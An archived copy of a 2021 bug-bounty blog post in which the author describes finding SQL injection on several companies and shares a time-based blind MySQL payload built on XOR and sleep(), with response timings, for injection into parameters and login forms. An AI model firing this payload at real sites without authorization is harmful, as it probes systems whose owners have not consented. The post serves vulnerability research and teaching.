---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-12_how-i-found-sql-injection-on-8x8-cengagecomodoautomattic20-company.md
original_filename: 2021-03-12_how-i-found-sql-injection-on-8x8-cengagecomodoautomattic20-company.md
title: How I Found Sql Injection on 8x8 , Cengage,Comodo,Automattic,20 company
category: documents
detected_topics:
- sqli
- command-injection
- cloud-security
tags:
- imported
- documents
- sqli
- command-injection
- cloud-security
language: en
raw_sha256: 9e8153c8d9ba0f5d300821ceb4fb4032c36c5b7ed4b8f2471d0e1fe1691821c9
text_sha256: 47a6c454a60bec77d13a6662ccbb220f6a13deed6b4c703aa79352d19d63eba9
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# How I Found Sql Injection on 8x8 , Cengage,Comodo,Automattic,20 company

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-12_how-i-found-sql-injection-on-8x8-cengagecomodoautomattic20-company.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `9e8153c8d9ba0f5d300821ceb4fb4032c36c5b7ed4b8f2471d0e1fe1691821c9`
- Text SHA256: `47a6c454a60bec77d13a6662ccbb220f6a13deed6b4c703aa79352d19d63eba9`


## Content

---
title: "How I Found Sql Injection on 8x8 , Cengage,Comodo,Automattic,20 company"
url: "https://ahmadaabdulla.medium.com/how-i-found-sql-injection-on-8x8-cengage-comodo-automattic-20-company-c296d1a09f63"
authors: ["Ahmad A Abdulla (@lu3ky13)"]
programs: ["Automattic", "IBM", "8x8"]
bugs: ["SQL injection"]
publication_date: "2021-03-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3820
scraped_via: "browseros"
---

# How I Found Sql Injection on 8x8 , Cengage,Comodo,Automattic,20 company

Ahmad A Abdulla
 highlighted

Ahmad A Abdulla
 highlighted

How I Found Sql Injection on 8x8 , Cengage,Comodo,Automattic,20 company
How I Found Sql Injection on 8x8 , Cengage ,Comodo ,Automattic ,intel ,IBM ,MTN Group ,uis.cam.ac.uk ,volvocars.biz ,asus.com
Ahmad A Abdulla
Follow
2 min read
·
Mar 12, 2021

560

5

If you want to learn bug bounty in an easy and affordable way, visit our website. The course is taught in English.

https://www.cybershield.krd/Courses/Course/28

What is SQL injection (SQLi)?

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application’s content or behavior.

I will show you my method to find SQL injection in one photo I hacked all this company in this way and reported in hacker and by email to the company
it’s easy to find SQL injection on the website just we need (burp) to test on the website now see these photos

Press enter or click to view image in full size

whit is this command ? why we use this ?

Get Ahmad A Abdulla’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

if you add sleep(12) the response time needs 12 seconds to browse the webpage and if you add sleep(20) the browser and the burp response after 20-second show you response and page

0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.508
0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.543
0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.523
0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.565
0"XOR(if(now()=sysdate(),sleep(3),0))XOR”Z => 3.518
0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.502
0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.491
0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.508
0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.695

I use this schedule to find SQL injection and I hacked 20 company from this methods

and another way to find SQL injection put this command in all parameters and login forms

I’m here

lu3ky13 is on @buymeacoffee! 🎉

You can support by buying a coffee ☕️ here —
https://www.buymeacoffee.com/lu3ky13

Ahmed Abdalkhaliq Abdulla
Iam a Cyber Security expert with over 10 years of professional experience in cyber security and finding exploits and…

lu3ky13.github.io

https://hackerone.com/lu3ky-13

https://twitter.com/lu3ky13
